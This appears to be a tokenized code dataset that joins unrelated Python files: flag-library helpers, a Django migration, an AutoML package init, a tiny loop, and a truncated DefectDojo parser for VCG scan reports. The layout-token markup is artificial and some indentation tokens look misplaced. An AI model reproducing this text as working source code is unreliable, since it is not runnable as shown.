platforms. <encdom> <indent> import termios <newline> <dedent> except ImportError : <newline> <indent> termios = None <newline> <dedent> import six <newline> from six . moves import range  # ▁ pylint: ▁ disable=redefined-builtin <encdom> <newline> _DEFAULT_HELP_WIDTH = 80  # ▁ Default ▁ width ▁ of ▁ help ▁ output. <encdom> <newline> _MIN_HELP_WIDTH = 40  # ▁ Minimal ▁"sane" ▁ width ▁ of ▁ help ▁ output. ▁ We ▁ assume ▁ that ▁ any <encdom> <newline>  # ▁ value ▁ below ▁ 40 ▁ is ▁ unreasonable. <encdom>  # ▁ Define ▁ the ▁ allowed ▁ error ▁ rate ▁ in ▁ an ▁ input ▁ string ▁ to ▁ get ▁ suggestions. <encdom>  # ▁ We ▁ lean ▁ towards ▁ a ▁ high ▁ threshold ▁ because ▁ we ▁ tend ▁ to ▁ be ▁ matching ▁ a ▁ phrase, <encdom>  # ▁ and ▁ the ▁ simple ▁ algorithm ▁ used ▁ here ▁ is ▁ geared ▁ towards ▁ correcting ▁ word <encdom>  # ▁ spellings. <encdom>  # ▁ For ▁ manual ▁ testing, ▁ consider ▁"<command> ▁ --list" ▁ which ▁ produced ▁ a ▁ large ▁ number <encdom>  # ▁ of ▁ spurious ▁ suggestions ▁ when ▁ we ▁ used ▁"least_errors ▁ > ▁ 0.5" ▁ instead ▁ of <encdom>  # ▁"least_erros ▁ >= ▁ 0.5". <encdom> _SUGGESTION_ERROR_RATE_THRESHOLD = 0.50 <newline>  # ▁ Characters ▁ that ▁ cannot ▁ appear ▁ or ▁ are ▁ highly ▁ discouraged ▁ in ▁ an ▁ XML ▁ 1.0 <encdom>  # ▁ document. ▁ (See ▁ http://www.w3.org/TR/REC-xml/ # charsets ▁ or <encdom>  # ▁ https://en.wikipedia.org/wiki/Valid_characters_in_XML # XML_1.0) <encdom> _ILLEGAL_XML_CHARS_REGEX = re . compile ( u'[\x00-\x08\x0b\x0c\x0e-\x1f\x7f-\x84\x86-\x9f\ud800-\udfff\ufffe\uffff]' ) <newline>  # ▁ This ▁ is ▁ a ▁ set ▁ of ▁ module ▁ ids ▁ for ▁ the ▁ modules ▁ that ▁ disclaim ▁ key ▁ flags. <encdom>  # ▁ This ▁ module ▁ is ▁ explicitly ▁ added ▁ to ▁ this ▁ set ▁ so ▁ that ▁ we ▁ never ▁ consider ▁ it ▁ to <encdom>  # ▁ define ▁ key ▁ flag. <encdom> disclaim_module_ids = set ( [ id ( sys . modules [ __name__ ] ) ] ) <newline>  # ▁ Define ▁ special ▁ flags ▁ here ▁ so ▁ that ▁ help ▁ may ▁ be ▁ generated ▁ for ▁ them. <encdom>  # ▁ NOTE: ▁ Please ▁ do ▁ NOT ▁ use ▁ SPECIAL_FLAGS ▁ from ▁ outside ▁ flags ▁ module. <encdom>  # ▁ Initialized ▁ inside ▁ flagvalues.py. <encdom> SPECIAL_FLAGS = None <newline>  # ▁ This ▁ points ▁ to ▁ the ▁ flags ▁ module, ▁ initialized ▁ in ▁ flags/__init__.py. <encdom>  # ▁ This ▁ should ▁ only ▁ be ▁ used ▁ in ▁ adopt_module_key_flags ▁ to ▁ take ▁ SPECIAL_FLAGS ▁ into <encdom>  # ▁ account. <encdom> FLAGS_MODULE = None <newline> class _ModuleObjectAndName ( collections . namedtuple ( '_ModuleObjectAndName' , 'module ▁ module_name' ) ) : <newline> <indent>  """ Module ▁ object ▁ and ▁ name. <strnewline> <strnewline> ▁ Fields: <strnewline> ▁ - ▁ module: ▁ object, ▁ module ▁ object. <strnewline> ▁ - ▁ module_name: ▁ str, ▁ module ▁ name. <strnewline> ▁ """  <newline> <dedent> def get_module_object_and_name ( globals_dict ) : <newline> <indent>  """ Returns ▁ the ▁ module ▁ that ▁ defines ▁ a ▁ global ▁ environment, ▁ and ▁ its ▁ name. <strnewline> <strnewline> ▁ Args: <strnewline> ▁ globals_dict: ▁ A ▁ dictionary ▁ that ▁ should ▁ correspond ▁ to ▁ an ▁ environment <strnewline> ▁ providing ▁ the ▁ values ▁ of ▁ the ▁ globals. <strnewline> <strnewline> ▁ Returns: <strnewline> ▁ _ModuleObjectAndName ▁ - ▁ pair ▁ of ▁ module ▁ object ▁ & ▁ module ▁ name. <strnewline> ▁ Returns ▁ (None, ▁ None) ▁ if ▁ the ▁ module ▁ could ▁ not ▁ be ▁ identified. <strnewline> ▁ """  <newline> name = globals_dict . get ( '__name__' , None ) <newline> module = sys . modules . get ( name , None ) <newline>  # ▁ Pick ▁ a ▁ more ▁ informative ▁ name ▁ for ▁ the ▁ main ▁ module. <encdom> return _ModuleObjectAndName ( module , ( sys . argv [ 0 ] if name == '__main__' else name ) ) <newline> <dedent> def get_calling_module_object_and_name ( ) : <newline> <indent>  """ Returns ▁ the ▁ module ▁ that's ▁ calling ▁ into ▁ this ▁ module. <strnewline> <strnewline> ▁ We ▁ generally ▁ use ▁ this ▁ function ▁ to ▁ get ▁ the ▁ name ▁ of ▁ the ▁ module ▁ calling ▁ a <strnewline> ▁ DEFINE_foo... ▁ function. <strnewline> <strnewline> ▁ Returns: <strnewline> ▁ The ▁ module ▁ object ▁ that ▁ called ▁ into ▁ this ▁ one. <strnewline> <strnewline> ▁ Raises: <strnewline> ▁ AssertionError: ▁ Raised ▁ when ▁ no ▁ calling ▁ module ▁ could ▁ be ▁ identified. <strnewline> ▁ """  <newline> for depth in range ( 1 , sys . getrecursionlimit ( ) ) : <newline>  # ▁ sys._getframe ▁ is ▁ the ▁ right ▁ thing ▁ to ▁ use ▁ here, ▁ as ▁ it's ▁ the ▁ best <encdom>  # ▁ way ▁ to ▁ walk ▁ up ▁ the ▁ call ▁ stack. <encdom> <indent> globals_for_frame = sys . _getframe ( depth ) . f_globals  # ▁ pylint: ▁ disable=protected-access <encdom> <newline> module , module_name = get_module_object_and_name ( globals_for_frame ) <newline> if id ( module ) not in disclaim_module_ids and module_name is not None : <newline> <indent> return _ModuleObjectAndName ( module , module_name ) <newline> <dedent> <dedent> raise AssertionError ( 'No ▁ module ▁ was ▁ found' ) <newline> <dedent> def get_calling_module ( ) : <newline> <indent>  """ Returns ▁ the ▁ name ▁ of ▁ the ▁ module ▁ that's ▁ calling ▁ into ▁ this ▁ module. """  <newline> return get_calling_module_object_and_name ( ) . module_name <newline> <dedent> def str_or_unicode ( value ) : <newline> <indent>  """ Converts ▁ a ▁ value ▁ to ▁ a ▁ python ▁ string. <strnewline> <strnewline> ▁ Behavior ▁ of ▁ this ▁ function ▁ is ▁ intentionally ▁ different ▁ in ▁ Python2/3. <strnewline> <strnewline> ▁ In ▁ Python2, ▁ the ▁ given ▁ value ▁ is ▁ attempted ▁ to ▁ convert ▁ to ▁ a ▁ str ▁ (byte ▁ string). <strnewline> ▁ If ▁ it ▁ contains ▁ non-ASCII ▁ characters, ▁ it ▁ is ▁ converted ▁ to ▁ a ▁ unicode ▁ instead. <strnewline> <strnewline> ▁ In ▁ Python3, ▁ the ▁ given ▁ value ▁ is ▁ always ▁ converted ▁ to ▁ a ▁ str ▁ (unicode ▁ string). <strnewline> <strnewline> ▁ This ▁ behavior ▁ reflects ▁ the ▁ (bad) ▁ practice ▁ in ▁ Python2 ▁ to ▁ try ▁ to ▁ represent <strnewline> ▁ a ▁ string ▁ as ▁ str ▁ as ▁ long ▁ as ▁ it ▁ contains ▁ ASCII ▁ characters ▁ only. <strnewline> <strnewline> ▁ Args: <strnewline> ▁ value: ▁ An ▁ object ▁ to ▁ be ▁ converted ▁ to ▁ a ▁ string. <strnewline> <strnewline> ▁ Returns: <strnewline> ▁ A ▁ string ▁ representation ▁ of ▁ the ▁ given ▁ value. ▁ See ▁ the ▁ description ▁ above <strnewline> ▁ for ▁ its ▁ type. <strnewline> ▁ """  <newline> try : <newline> <indent> return str ( value ) <newline> <dedent> except UnicodeEncodeError : <newline> <indent> return unicode ( value )  # ▁ Python3 ▁ should ▁ never ▁ come ▁ here <encdom> <newline> <dedent> <dedent> def create_xml_dom_element ( doc , name , value ) : <newline> <indent>  """ Returns ▁ an ▁ XML ▁ DOM ▁ element ▁ with ▁ name ▁ and ▁ text ▁ value. <strnewline> <strnewline> ▁ Args: <strnewline> ▁ doc: ▁ minidom.Document, ▁ the ▁ DOM ▁ document ▁ it ▁ should ▁ create ▁ nodes ▁ from. <strnewline> ▁ name: ▁ str, ▁ the ▁ tag ▁ of ▁ XML ▁ element. <strnewline> ▁ value: ▁ object, ▁ whose ▁ string ▁ representation ▁ will ▁ be ▁ used <strnewline> ▁ as ▁ the ▁ value ▁ of ▁ the ▁ XML ▁ element. ▁ Illegal ▁ or ▁ highly ▁ discouraged ▁ xml ▁ 1.0 <strnewline> ▁ characters ▁ are ▁ stripped. <strnewline> <strnewline> ▁ Returns: <strnewline> ▁ An ▁ instance ▁ of ▁ minidom.Element. <strnewline> ▁ """  <newline> s = str_or_unicode ( value ) <newline> if six . PY2 and not isinstance ( s , unicode ) : <newline>  # ▁ Get ▁ a ▁ valid ▁ unicode ▁ string. <encdom> <indent> s = s . decode ( 'utf-8' , 'ignore' ) <newline> <dedent> if isinstance ( value , bool ) : <newline>  # ▁ Display ▁ boolean ▁ values ▁ as ▁ the ▁ C++ ▁ flag ▁ library ▁ does: ▁ no ▁ caps. <encdom> <indent> s = s . lower ( ) <newline>  # ▁ Remove ▁ illegal ▁ xml ▁ characters. <encdom> <dedent> s = _ILLEGAL_XML_CHARS_REGEX . sub ( u'' , s ) <newline> e = doc . createElement ( name ) <newline> e . appendChild ( doc . createTextNode ( s ) ) <newline> return e <newline> <dedent> def get_help_width ( ) : <newline> <indent>  """ Returns ▁ the ▁ integer ▁ width ▁ of ▁ help ▁ lines ▁ that ▁ is ▁ used ▁ in ▁ TextWrap. """  <newline> if not sys . stdout . isatty ( ) or termios is None or fcntl is None : <newline> <indent> return _DEFAULT_HELP_WIDTH <newline> <dedent> try : <newline> <indent> data = fcntl . ioctl ( sys . stdout , termios . TIOCGWINSZ , '1234' ) <newline> columns = struct . unpack ( 'hh' , data ) [ 1 ] <newline>  # ▁ Emacs ▁ mode ▁ returns ▁ 0. <encdom>  # ▁ Here ▁ we ▁ assume ▁ that ▁ any ▁ value ▁ below ▁ 40 ▁ is ▁ unreasonable. <encdom> if columns >= _MIN_HELP_WIDTH : <newline> <indent> return columns <newline>  # ▁ Returning ▁ an ▁ int ▁ as ▁ default ▁ is ▁ fine, ▁ int(int) ▁ just ▁ return ▁ the ▁ int. <encdom> <dedent> return int ( os . getenv ( 'COLUMNS' , _DEFAULT_HELP_WIDTH ) ) <newline> <dedent> except ( TypeError , IOError , struct . error ) : <newline> <indent> return _DEFAULT_HELP_WIDTH <newline> <dedent> <dedent> def get_flag_suggestions ( attempt , longopt_list ) : <newline> <indent>  """ Returns ▁ helpful ▁ similar ▁ matches ▁ for ▁ an ▁ invalid ▁ flag. """  <newline>  # ▁ Don't ▁ suggest ▁ on ▁ very ▁ short ▁ strings, ▁ or ▁ if ▁ no ▁ longopts ▁ are ▁ specified. <encdom> if len ( attempt ) <= 2 or not longopt_list : <newline> <indent> return [ ] <newline> <dedent> option_names = [ v . split ( '=' ) [ 0 ] for v in longopt_list ] <newline>  # ▁ Find ▁ close ▁ approximations ▁ in ▁ flag ▁ prefixes. <encdom>  # ▁ This ▁ also ▁ handles ▁ the ▁ case ▁ where ▁ the ▁ flag ▁ is ▁ spelled ▁ right ▁ but ▁ ambiguous. <encdom> distances = [ ( _damerau_levenshtein ( attempt , option [ 0 : len ( attempt ) ] ) , option ) for option in option_names ] <newline> distances . sort ( key = lambda t : t [ 0 ] ) <newline> least_errors , _ = distances [ 0 ] <newline>  # ▁ Don't ▁ suggest ▁ excessively ▁ bad ▁ matches. <encdom> if least_errors >= _SUGGESTION_ERROR_RATE_THRESHOLD * len ( attempt ) : <newline> <indent> return [ ] <newline> <dedent> suggestions = [ ] <newline> for errors , name in distances : <newline> <indent> if errors == least_errors : <newline> <indent> suggestions . append ( name ) <newline> <dedent> else : <newline> <indent> break <newline> <dedent> <dedent> return suggestions <newline> <dedent> def _damerau_levenshtein ( a , b ) : <newline> <indent>  """ Returns ▁ Damerau-Levenshtein ▁ edit ▁ distance ▁ from ▁ a ▁ to ▁ b. """  <newline> memo = { } <newline> def distance ( x , y ) : <newline> <indent>  """ Recursively ▁ defined ▁ string ▁ distance ▁ with ▁ memoization. """  <newline> if ( x , y ) in memo : <newline> <indent> return memo [ x , y ] <newline> <dedent> if not x : <newline> <indent> d = len ( y ) <newline> <dedent> elif not y : <newline> <indent> d = len ( x ) <newline> <dedent> else : <newline> <indent> d = min ( distance ( x [ 1 : ] , y ) + 1 ,  # ▁ correct ▁ an ▁ insertion ▁ error <encdom> distance ( x , y [ 1 : ] ) + 1 ,  # ▁ correct ▁ a ▁ deletion ▁ error <encdom> distance ( x [ 1 : ] , y [ 1 : ] ) + ( x [ 0 ] != y [ 0 ] ) )  # ▁ correct ▁ a ▁ wrong ▁ character <encdom> <newline> if len ( x ) >= 2 and len ( y ) >= 2 and x [ 0 ] == y [ 1 ] and x [ 1 ] == y [ 0 ] : <newline>  # ▁ Correct ▁ a ▁ transposition. <encdom> <indent> t = distance ( x [ 2 : ] , y [ 2 : ] ) + 1 <newline> if d > t : <newline> <indent> d = t <newline> <dedent> <dedent> <dedent> memo [ x , y ] = d <newline> return d <newline> <dedent> return distance ( a , b ) <newline> <dedent> def text_wrap ( text , length = None , indent = '' , firstline_indent = None ) : <newline> <indent>  """ Wraps ▁ a ▁ given ▁ text ▁ to ▁ a ▁ maximum ▁ line ▁ length ▁ and ▁ returns ▁ it. <strnewline> <strnewline> ▁ It ▁ turns ▁ lines ▁ that ▁ only ▁ contain ▁ whitespace ▁ into ▁ empty ▁ lines, ▁ keeps ▁ new ▁ lines, <strnewline> ▁ and ▁ expands ▁ tabs ▁ using ▁ 4 ▁ spaces. <strnewline> <strnewline> ▁ Args: <strnewline> ▁ text: ▁ str, ▁ text ▁ to ▁ wrap. <strnewline> ▁ length: ▁ int, ▁ maximum ▁ length ▁ of ▁ a ▁ line, ▁ includes ▁ indentation. <strnewline> ▁ If ▁ this ▁ is ▁ None ▁ then ▁ use ▁ get_help_width() <strnewline> ▁ indent: ▁ str, ▁ indent ▁ for ▁ all ▁ but ▁ first ▁ line. <strnewline> ▁ firstline_indent: ▁ str, ▁ indent ▁ for ▁ first ▁ line; ▁ if ▁ None, ▁ fall ▁ back ▁ to ▁ indent. <strnewline> <strnewline> ▁ Returns: <strnewline> ▁ str, ▁ the ▁ wrapped ▁ text. <strnewline> <strnewline> ▁ Raises: <strnewline> ▁ ValueError: ▁ Raised ▁ if ▁ indent ▁ or ▁ firstline_indent ▁ not ▁ shorter ▁ than ▁ length. <strnewline> ▁ """  <newline>  # ▁ Get ▁ defaults ▁ where ▁ callee ▁ used ▁ None <encdom> if length is None : <newline> <indent> length = get_help_width ( ) <newline> <dedent> if indent is None : <newline> <indent> indent = '' <newline> <dedent> if firstline_indent is None : <newline> <indent> firstline_indent = indent <newline> <dedent> if len ( indent ) >= length : <newline> <indent> raise ValueError ( 'Length ▁ of ▁ indent ▁ exceeds ▁ length' ) <newline> <dedent> if len ( firstline_indent ) >= length : <newline> <indent> raise ValueError ( 'Length ▁ of ▁ first ▁ line ▁ indent ▁ exceeds ▁ length' ) <newline> <dedent> text = text . expandtabs ( 4 ) <newline> result = [ ] <newline>  # ▁ Create ▁ one ▁ wrapper ▁ for ▁ the ▁ first ▁ paragraph ▁ and ▁ one ▁ for ▁ subsequent <encdom>  # ▁ paragraphs ▁ that ▁ does ▁ not ▁ have ▁ the ▁ initial ▁ wrapping. <encdom> wrapper = textwrap . TextWrapper ( width = length , initial_indent = firstline_indent , subsequent_indent = indent ) <newline> subsequent_wrapper = textwrap . TextWrapper ( width = length , initial_indent = indent , subsequent_indent = indent ) <newline>  # ▁ textwrap ▁ does ▁ not ▁ have ▁ any ▁ special ▁ treatment ▁ for ▁ newlines. ▁ From ▁ the ▁ docs: <encdom>  # ▁ "...newlines ▁ may ▁ appear ▁ in ▁ the ▁ middle ▁ of ▁ a ▁ line ▁ and ▁ cause ▁ strange ▁ output. <encdom>  # ▁ For ▁ this ▁ reason, ▁ text ▁ should ▁ be ▁ split ▁ into ▁ paragraphs ▁ (using <encdom>  # ▁ str.splitlines() ▁ or ▁ similar) ▁ which ▁ are ▁ wrapped ▁ separately." <encdom> for paragraph in ( p . strip ( ) for p in text . splitlines ( ) ) : <newline> <indent> if paragraph : <newline> <indent> result . extend ( wrapper . wrap ( paragraph ) ) <newline> <dedent> else : <newline> <indent> result . append ( '' )  # ▁ Keep ▁ empty ▁ lines. <encdom> <newline>  # ▁ Replace ▁ initial ▁ wrapper ▁ with ▁ wrapper ▁ for ▁ subsequent ▁ paragraphs. <encdom> <dedent> wrapper = subsequent_wrapper <newline> <dedent> return ' \n ' . join ( result ) <newline> <dedent> def flag_dict_to_args ( flag_map ) : <newline> <indent>  """ Convert ▁ a ▁ dict ▁ of ▁ values ▁ into ▁ process ▁ call ▁ parameters. <strnewline> <strnewline> ▁ This ▁ method ▁ is ▁ used ▁ to ▁ convert ▁ a ▁ dictionary ▁ into ▁ a ▁ sequence ▁ of ▁ parameters <strnewline> ▁ for ▁ a ▁ binary ▁ that ▁ parses ▁ arguments ▁ using ▁ this ▁ module. <strnewline> <strnewline> ▁ Args: <strnewline> ▁ flag_map: ▁ dict, ▁ a ▁ mapping ▁ where ▁ the ▁ keys ▁ are ▁ flag ▁ names ▁ (strings). <strnewline> ▁ values ▁ are ▁ treated ▁ according ▁ to ▁ their ▁ type: <strnewline> ▁ * ▁ If ▁ value ▁ is ▁ None, ▁ then ▁ only ▁ the ▁ name ▁ is ▁ emitted. <strnewline> ▁ * ▁ If ▁ value ▁ is ▁ True, ▁ then ▁ only ▁ the ▁ name ▁ is ▁ emitted. <strnewline> ▁ * ▁ If ▁ value ▁ is ▁ False, ▁ then ▁ only ▁ the ▁ name ▁ prepended ▁ with ▁'no' ▁ is ▁ emitted. <strnewline> ▁ * ▁ If ▁ value ▁ is ▁ a ▁ string ▁ then ▁ --name=value ▁ is ▁ emitted. <strnewline> ▁ * ▁ If ▁ value ▁ is ▁ a ▁ collection, ▁ this ▁ will ▁ emit ▁ --name=value1,value2,value3. <strnewline> ▁ * ▁ Everything ▁ else ▁ is ▁ converted ▁ to ▁ string ▁ an ▁ passed ▁ as ▁ such. <strnewline> ▁ Yields: <strnewline> ▁ sequence ▁ of ▁ string ▁ suitable ▁ for ▁ a ▁ subprocess ▁ execution. <strnewline> ▁ """  <newline> for key , value in six . iteritems ( flag_map ) : <newline> <indent> if value is None : <newline> <indent> yield '--%s' % key <newline> <dedent> elif isinstance ( value , bool ) : <newline> <indent> if value : <newline> <indent> yield '--%s' % key <newline> <dedent> else : <newline> <indent> yield '--no%s' % key <newline> <dedent> <dedent> elif isinstance ( value , ( bytes , type ( u'' ) ) ) : <newline>  # ▁ We ▁ don't ▁ want ▁ strings ▁ to ▁ be ▁ handled ▁ like ▁ python ▁ collections. <encdom> <indent> yield '--%s=%s' % ( key , value ) <newline> <dedent> else : <newline>  # ▁ Now ▁ we ▁ attempt ▁ to ▁ deal ▁ with ▁ collections. <encdom> <indent> try : <newline> <indent> yield '--%s=%s' % ( key , ',' . join ( str ( item ) for item in value ) ) <newline> <dedent> except TypeError : <newline>  # ▁ Default ▁ case. <encdom> <indent> yield '--%s=%s' % ( key , value ) <newline> <dedent> <dedent> <dedent> <dedent> def trim_docstring ( docstring ) : <newline> <indent>  """ Removes ▁ indentation ▁ from ▁ triple-quoted ▁ strings. <strnewline> <strnewline> ▁ This ▁ is ▁ the ▁ function ▁ specified ▁ in ▁ PEP ▁ 257 ▁ to ▁ handle ▁ docstrings: <strnewline> ▁ https://www.python.org/dev/peps/pep-0257/. <strnewline> <strnewline> ▁ Args: <strnewline> ▁ docstring: ▁ str, ▁ a ▁ python ▁ docstring. <strnewline> <strnewline> ▁ Returns: <strnewline> ▁ str, ▁ docstring ▁ with ▁ indentation ▁ removed. <strnewline> ▁ """  <newline> if not docstring : <newline> <indent> return '' <newline>  # ▁ If ▁ you've ▁ got ▁ a ▁ line ▁ longer ▁ than ▁ this ▁ you ▁ have ▁ other ▁ problems... <encdom> <dedent> max_indent = 1 << 29 <newline>  # ▁ Convert ▁ tabs ▁ to ▁ spaces ▁ (following ▁ the ▁ normal ▁ Python ▁ rules) <encdom>  # ▁ and ▁ split ▁ into ▁ a ▁ list ▁ of ▁ lines: <encdom> lines = docstring . expandtabs ( ) . splitlines ( ) <newline>  # ▁ Determine ▁ minimum ▁ indentation ▁ (first ▁ line ▁ doesn't ▁ count): <encdom> indent = max_indent <newline> for line in lines [ 1 : ] : <newline> <indent> stripped = line . lstrip ( ) <newline> if stripped : <newline> <indent> indent = min ( indent , len ( line ) - len ( stripped ) ) <newline>  # ▁ Remove ▁ indentation ▁ (first ▁ line ▁ is ▁ special): <encdom> <dedent> <dedent> trimmed = [ lines [ 0 ] . strip ( ) ] <newline> if indent < max_indent : <newline> <indent> for line in lines [ 1 : ] : <newline> <indent> trimmed . append ( line [ indent : ] . rstrip ( ) ) <newline>  # ▁ Strip ▁ off ▁ trailing ▁ and ▁ leading ▁ blank ▁ lines: <encdom> <dedent> <dedent> while trimmed and not trimmed [ - 1 ] : <newline> <indent> trimmed . pop ( ) <newline> <dedent> while trimmed and not trimmed [ 0 ] : <newline> <indent> trimmed . pop ( 0 ) <newline>  # ▁ Return ▁ a ▁ single ▁ string: <encdom> <dedent> return ' \n ' . join ( trimmed ) <newline> <dedent> def doc_to_help ( doc ) : <newline> <indent>  """ Takes ▁ a ▁ __doc__ ▁ string ▁ and ▁ reformats ▁ it ▁ as ▁ help. """  <newline>  # ▁ Get ▁ rid ▁ of ▁ starting ▁ and ▁ ending ▁ white ▁ space. ▁ Using ▁ lstrip() ▁ or ▁ even <encdom>  # ▁ strip() ▁ could ▁ drop ▁ more ▁ than ▁ maximum ▁ of ▁ first ▁ line ▁ and ▁ right ▁ space <encdom>  # ▁ of ▁ last ▁ line. <encdom> doc = doc . strip ( ) <newline>  # ▁ Get ▁ rid ▁ of ▁ all ▁ empty ▁ lines. <encdom> whitespace_only_line = re . compile ( '^[ ▁ \t]+$' , re . M ) <newline> doc = whitespace_only_line . sub ( '' , doc ) <newline>  # ▁ Cut ▁ out ▁ common ▁ space ▁ at ▁ line ▁ beginnings. <encdom> doc = trim_docstring ( doc ) <newline>  # ▁ Just ▁ like ▁ this ▁ module's ▁ comment, ▁ comments ▁ tend ▁ to ▁ be ▁ aligned ▁ somehow. <encdom>  # ▁ In ▁ other ▁ words ▁ they ▁ all ▁ start ▁ with ▁ the ▁ same ▁ amount ▁ of ▁ white ▁ space. <encdom>  # ▁ 1) ▁ keep ▁ double ▁ new ▁ lines; <encdom>  # ▁ 2) ▁ keep ▁ ws ▁ after ▁ new ▁ lines ▁ if ▁ not ▁ empty ▁ line; <encdom>  # ▁ 3) ▁ all ▁ other ▁ new ▁ lines ▁ shall ▁ be ▁ changed ▁ to ▁ a ▁ space; <encdom>  # ▁ Solution: ▁ Match ▁ new ▁ lines ▁ between ▁ non ▁ white ▁ space ▁ and ▁ replace ▁ with ▁ space. <encdom> doc = re . sub ( r'(?<=\S) \n (?=\S)' , ' ▁ ' , doc , flags = re . M ) <newline> return doc <newline> <dedent> def is_bytes_or_string ( maybe_string ) : <newline> <indent> if str is bytes : <newline> <indent> return isinstance ( maybe_string , basestring ) <newline> <dedent> else : <newline> <indent> return isinstance ( maybe_string , ( str , bytes ) ) <newline> <dedent> <dedent>
 # ▁ -*- ▁ coding: ▁ utf-8 ▁ -*- <encdom>  # ▁ Generated ▁ by ▁ Django ▁ 1.9.2 ▁ on ▁ 2016-02-11 ▁ 22:21 <encdom> from __future__ import unicode_literals <newline> from django . db import migrations , models <newline> class Migration ( migrations . Migration ) : <newline> <indent> dependencies = [ ( 'signage' , '0002_auto_20151230_2151' ) ] <newline> operations = [ migrations . AddField ( model_name = 'sign' , name = 'use_frameset' , field = models . BooleanField ( default = False ) , ) ] <newline> <dedent>
 # ▁ -*- ▁ coding: ▁ utf-8 ▁ -*- <encdom>  # ▁ Copyright ▁ 2018 ▁ Google ▁ LLC <encdom>  # ▁ Licensed ▁ under ▁ the ▁ Apache ▁ License, ▁ Version ▁ 2.0 ▁ (the ▁"License"); <encdom>  # ▁ you ▁ may ▁ not ▁ use ▁ this ▁ file ▁ except ▁ in ▁ compliance ▁ with ▁ the ▁ License. <encdom>  # ▁ You ▁ may ▁ obtain ▁ a ▁ copy ▁ of ▁ the ▁ License ▁ at <encdom>  # ▁ https://www.apache.org/licenses/LICENSE-2.0 <encdom>  # ▁ Unless ▁ required ▁ by ▁ applicable ▁ law ▁ or ▁ agreed ▁ to ▁ in ▁ writing, ▁ software <encdom>  # ▁ distributed ▁ under ▁ the ▁ License ▁ is ▁ distributed ▁ on ▁ an ▁"AS ▁ IS" ▁ BASIS, <encdom>  # ▁ WITHOUT ▁ WARRANTIES ▁ OR ▁ CONDITIONS ▁ OF ▁ ANY ▁ KIND, ▁ either ▁ express ▁ or ▁ implied. <encdom>  # ▁ See ▁ the ▁ License ▁ for ▁ the ▁ specific ▁ language ▁ governing ▁ permissions ▁ and <encdom>  # ▁ limitations ▁ under ▁ the ▁ License. <encdom> from __future__ import absolute_import <newline> from google . cloud . automl_v1beta1 import AutoMlClient <newline> from google . cloud . automl_v1beta1 import PredictionServiceClient <newline> from google . cloud . automl_v1beta1 import enums <newline> from google . cloud . automl_v1beta1 import types <newline> __all__ = ( 'enums' , 'types' , 'PredictionServiceClient' , 'AutoMlClient' , ) <newline>
while 1 : <newline> <indent> a = 1 <newline> break <newline> <dedent> print ( a )  # ▁ pass <encdom> <newline>
import StringIO <newline> import csv <newline> import hashlib <newline> from defusedxml import ElementTree <newline> from dojo . models import Finding <newline> class VCGFinding ( object ) : <newline> <indent> def get_finding_severity ( self ) : <newline> <indent> return self . priority_mapping [ self . priority ] <newline> <dedent> def get_finding_detail ( self ) : <newline> <indent> finding_detail = '' <newline> if self . severity is not None : <newline> <indent> finding_detail = 'Severity: ▁ ' + self . severity + ' \n ' <newline> <dedent> if self . description is not None : <newline> <indent> finding_detail += 'Description: ▁ ' + self . description + ' \n ' <newline> <dedent> if self . filename is not None : <newline> <indent> finding_detail += 'FileName: ▁ ' + self . filename + ' \n ' <newline> <dedent> if self . line is not None : <newline> <indent> finding_detail += 'Line: ▁ ' + self . line + ' \n ' <newline> <dedent> if self . code_line is not None : <newline> <indent> finding_detail += 'CodeLine: ▁ ' + self . code_line + ' \n ' <newline> <dedent> return finding_detail <newline> <dedent> def to_finding ( self , test ) : <newline> <indent> return Finding ( title = self . title , test = test , active = False , verified = False , description = self . get_finding_detail ( ) , severity = self . get_finding_severity ( ) , numerical_severity = Finding . get_numerical_severity ( self . get_finding_severity ( ) ) ) <newline> <dedent> def __init__ ( self ) : <newline> <indent> self . priority = 6 <newline> self . title = '' <newline> self . severity = '' <newline> self . description = '' <newline> self . filename = '' <newline> self . line = '' <newline> self . code_line = '' <newline> self . priority_mapping = dict ( ) <newline> self . priority_mapping [ 1 ] = 'Critical' <newline> self . priority_mapping [ 2 ] = 'High' <newline> self . priority_mapping [ 3 ] = 'Medium' <newline> self . priority_mapping [ 4 ] = 'Low' <newline> self . priority_mapping [ 5 ] = 'Low' <newline> self . priority_mapping [ 6 ] = 'Info' <newline> self . priority_mapping [ 7 ] = 'Info' <newline> <dedent> <dedent> class VCGXmlParser ( object ) : <newline> <indent> @ staticmethod <newline> def get_field_from_xml ( issue , field ) : <newline> <indent> if issue . find ( field ) is not None and issue . find ( field ) . text is not None : <newline> <indent> return issue . find ( field ) . text <newline> <dedent> else : <newline> <indent> return None <newline> <dedent> <dedent> def __init__ ( self ) : <newline> <indent> pass <newline> <dedent> def parse_issue ( self , issue , test ) : <newline> <indent> if issue is None : <newline> <indent> return None <newline> <dedent> data = VCGFinding ( ) <newline> if self . get_field_from_xml ( issue , 'Priority' ) is None : <newline> <indent> data . priority = 6 <newline> <dedent> else : <newline> <indent> data . priority = int ( float ( self . get_field_from_xml ( issue , 'Priority' ) ) ) <newline> <dedent> data . title = '' if self . get_field_from_xml ( issue , 'Title' ) is None else self . get_field_from_xml ( issue , 'Title' ) <newline> data . severity = self . get_field_from_xml ( issue , 'Severity' ) <newline> data . description = self . get_field_from_xml ( issue , 'Description' ) <newline> data . filename = self . get_field_from_xml ( issue , 'FileName' ) <newline> data . line = self . get_field_from_xml ( issue , 'Line' ) <newline> data . code_line = self . get_field_from_xml ( issue , 'CodeLine' ) <newline> finding = data . to_finding ( test ) <newline> return finding <newline> <dedent> def parse ( self , content , test ) : <newline> <indent> dupes = dict ( ) <newline> if content is None : <newline> <indent> return dupes <newline> <dedent> vcgscan = ElementTree . fromstring ( content ) <newline> for issue in vcgscan . findall ( 'CodeIssue' ) : <newline> <indent> finding = self . parse_issue ( issue , test ) <newline> if finding is not None : <newline> <indent> key = hashlib . md5 ( finding . severity + '|' + finding . title + '|' + finding . description ) . hexdigest ( ) <newline> if key not in dupes : <newline> <indent> dupes [ key ] = finding <newline> <dedent> <dedent> <dedent> return dupes <newline> <dedent> <dedent> class VCGCsvParser ( object ) : <newline> <indent> @ staticmethod <newline> def get_field_from_row ( row , column ) : <newline> <indent> if row [ column ] is not None : <newline> <indent> return row [ column ] <newline> <dedent> else : <newline> <indent> return None <newline> <dedent> <dedent> def parse_issue ( self , row , test ) : <newline> <indent> if not row : <newline> <indent> return None <newline> <dedent> priority_column = 0 <newline> severity_column = 1 <newline> title_column = 2 <newline> description_column = 3 <newline> filename_column = 4 <newline> line_column = 5 <newline> code_line_column = 6 <newline> data = VCGFinding ( ) <newline> if self . get_field_from_row ( row , title_column ) is None : <newline> 